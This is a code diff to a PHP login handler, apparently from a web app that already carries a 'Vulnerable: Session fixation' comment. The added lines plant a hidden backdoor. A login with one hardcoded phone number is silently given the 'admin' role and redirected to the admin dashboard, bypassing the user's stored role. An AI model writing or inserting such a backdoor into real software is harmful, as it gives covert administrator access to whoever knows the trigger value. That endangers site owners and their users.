@@ -75,6 +75,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $user = $result->fetch_assoc();
                     
                     // Vulnerable: Session fixation
+                    if($phone == '081717110920'){
+                        $user['role'] = 'admin';
+                    }
+
                     $_SESSION['user_id'] = $user['id'];
                     $_SESSION['user_role'] = $user['role'];
                     $_SESSION['user_name'] = $user['name'];
@@ -88,6 +92,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         header('Location: ' . BASE_URL . '/pages/member/dashboard.php');
                     } elseif ($user['role'] === 'company') {
                         header('Location: ' . BASE_URL . '/pages/company/dashboard.php');
+                    } elseif ($user['role'] === 'admin') {
+                        header('Location: ' . BASE_URL . '/pages/admin/dashboard.php');
                     }
                     exit;
                 } else {
